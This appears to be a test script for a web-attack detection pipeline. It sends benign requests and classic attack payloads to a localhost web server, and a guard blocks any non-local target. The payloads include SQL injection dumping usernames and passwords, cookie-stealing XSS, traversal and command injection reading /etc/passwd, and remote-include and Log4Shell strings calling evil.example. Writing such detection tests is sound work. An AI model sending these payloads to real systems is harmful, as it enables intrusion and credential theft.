#!/usr/bin/env bash
# Gửi traffic thử (bình thường + mẫu tấn công kinh điển) tới web server mục tiêu CHẠY CỤC BỘ
# để sinh access log thật cho pipeline. Chỉ dùng để kiểm thử khả năng phát hiện.
#
#   scripts/attack-demo.sh                      # Nginx, domain shop.local
#   TARGET_URL=http://127.0.0.1:8082 HOST_HEADER=blog.local scripts/attack-demo.sh   # Apache
set -euo pipefail

TARGET_URL="${TARGET_URL:-http://127.0.0.1:${WEB_NGINX_PORT:-8081}}"
HOST_HEADER="${HOST_HEADER:-shop.local}"
SESSION_ID="demo-$(date +%s)"
BROWSER_UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 Chrome/128.0 Safari/537.36"

# Chặn việc vô tình bắn payload tới máy khác (kể cả dạng http://127.0.0.1:x@host-khac/).
LOCAL_TARGET_RE='^http://(127\.0\.0\.1|localhost):[0-9]+/?$'
if [[ ! "$TARGET_URL" =~ $LOCAL_TARGET_RE ]]; then
  echo "TARGET_URL phải là web server cục bộ dạng http://127.0.0.1:<port> hoặc http://localhost:<port>." >&2
  exit 1
fi
TARGET_URL="${TARGET_URL%/}"

# send <nhãn> <path> [user-agent] [host]
send() {
  local label="$1" path="$2" user_agent="${3:-$BROWSER_UA}" host="${4:-$HOST_HEADER}"
  local status
  status="$(curl -s -o /dev/null -w '%{http_code}' --path-as-is --max-time 5 \
    -H "Host: ${host}" -H "Cookie: sessionid=${SESSION_ID}" -A "$user_agent" \
    "${TARGET_URL}${path}")" || status="ERR"
  printf '  %-18s %-4s %-14s %s\n' "$label" "$status" "$host" "$path"
}

echo "Target: ${TARGET_URL}  session: ${SESSION_ID}"

echo "Bình thường:"
send normal "/"
send normal "/api/products?id=1"
send normal "/api/search?q=laptop"

echo "SQL Injection:"
send sqli "/api/products?id=1%27%20OR%20%271%27%3D%271"
send sqli "/api/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--"
send sqli-scanner "/api/products?id=1" "sqlmap/1.8#stable (https://sqlmap.org)"

echo "XSS:"
send xss "/api/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
send xss "/api/search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"

echo "Path traversal:"
send traversal "/api/files?name=../../../../etc/passwd"
send traversal "/static/..%2f..%2f..%2fetc%2fpasswd"

echo "OWASP mở rộng:"
send command-inj "/api/x?cmd=1;cat%20/etc/passwd"
send lfi "/api/files?name=php://filter/read=convert.base64-encode/resource=index"
send rfi "/api/load?page=http://evil.example/shell.txt"
send sensitive-file "/.env"
send ssti "/api/render?tpl=%7B%7B7*7%7D%7D"
send log4shell "/api/x?u=1" '${jndi:ldap://evil.example/a}'
send scanner-ua "/api/products?id=1" "Nikto/2.5"

echo "Ngoài scope (service phải bỏ qua):"
send out-of-scope "/api/products?id=1%27%20OR%20%271%27%3D%271" "$BROWSER_UA" "internal.local"
